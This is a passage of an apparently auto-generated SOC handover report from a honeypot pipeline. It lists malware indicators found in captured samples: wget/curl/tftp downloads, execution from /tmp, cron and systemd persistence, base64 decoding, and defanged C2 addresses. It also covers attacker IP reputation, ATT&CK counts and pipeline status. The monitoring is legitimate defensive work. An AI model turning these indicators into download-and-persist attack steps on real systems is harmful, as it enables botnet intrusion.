| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `58.221.60[.]25` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `137.184.5[.]188` | US | DigitalOcean, LLC | **100** ⚠️ | 50 |
| `160.119.66[.]206` | NL | HostMem | **100** ⚠️ | 10 |
| `88.218.94[.]33` | GE | BEAFORT LIMITED | **100** ⚠️ | 8 |
| `91.225.234[.]165` | UA | PE Golub Iryna Anatoliivna | **100** ⚠️ | 2 |
| `130.12.180[.]174` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `186.23.178[.]191` | AR | Telecentro S.A. | **100** ⚠️ | 2 |
| `45.79.207[.]111` | US | Linode | **100** ⚠️ | 50 |
| `23.94.206[.]233` | US | HostPapa | **100** ⚠️ | 6 |
| `77.239.124[.]130` | NL | ROCKET & MARINICA LTD | **100** ⚠️ | 49 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 163 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 145 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 29 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 21 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 17 |

---

## 🔕 False Positive Summary (11 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 255 cases |
| Tool 34  | Credential Extractor        | ✅ 435 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 16 fingerprints |
| Tool 36  | Command Clustering          | ✅ 7 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 75 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 11 filtered (4.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 45 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 23 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 143 priority case(s) shown individually · 38 recon entry/entries in table (12 group(s) consolidating 75 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-19T22:17:04Z_
